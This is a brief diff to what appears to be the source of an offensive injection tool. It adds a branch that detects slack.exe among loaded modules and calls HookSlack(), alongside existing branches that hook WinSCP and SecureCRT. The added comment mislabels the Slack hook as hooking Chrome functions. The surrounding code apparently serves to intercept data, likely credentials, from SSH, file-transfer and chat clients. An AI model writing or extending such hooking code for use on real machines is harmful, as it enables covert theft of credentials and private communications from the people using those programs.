@@ -189,6 +189,15 @@ void Inject()
 			HookWinSCP(); 
 		}
 
+		// slack.exe
+
+		else if (Utils::ToLower(vDlls[i].szModule).compare("slack.exe") == 0)
+		{
+			// Hook Chrome functions
+
+			HookSlack();
+		}
+
 		// SecureCRT
 
 		else if (Utils::ToLower(vDlls[i].szModule).compare("ssh2core83u.dll") == 0)
